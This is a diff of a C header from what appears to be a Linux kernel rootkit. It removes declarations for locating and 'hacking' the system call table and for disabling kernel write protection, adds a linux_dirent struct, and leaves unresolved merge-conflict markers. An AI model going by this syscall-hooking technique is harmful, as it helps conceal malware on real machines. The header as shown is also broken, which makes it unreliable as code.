@@ -1,5 +1,5 @@
-#ifndef __SYSCALLTABLE__
-#define __SYSCALLTABLE__
+#ifndef __MAIN__
+#define __MAIN__
 
 #include <linux/file.h>
 #include <linux/dirent.h>
@@ -15,18 +15,18 @@
 #include <linux/syscalls.h> /* sys_close __NR_close __NR_mkdir */
 #include <linux/delay.h> /* loops_per_jiffy */
 #include <asm/bitops.h> /* set_bit clear_bit */
-#include "config.h"
-#include "util.h"
-#include "cmd.h"
-#include "list.h"
 
-unsigned int find_do_fork(void);
-extern unsigned long **sys_call_table;
-void disable_write_protection(void);
-void enable_write_protection(void);
-unsigned long **find_sys_call_table(void);
-long prehack_sys_call_table(void);
-void hack_sys_call_talbe(void);
-void unhack_sys_call_talbe(void);
+struct linux_dirent {
+	unsigned long d_ino;
+	unsigned long d_off;
+	unsigned short d_reclen;
+	char d_name[1];
+};
 
-#endif
+
+<<<<<<< HEAD
+
+
+=======
+>>>>>>> 884f7fbed93b1f333a0ad3295fe448314d32affa
+#endif // __MAIN__
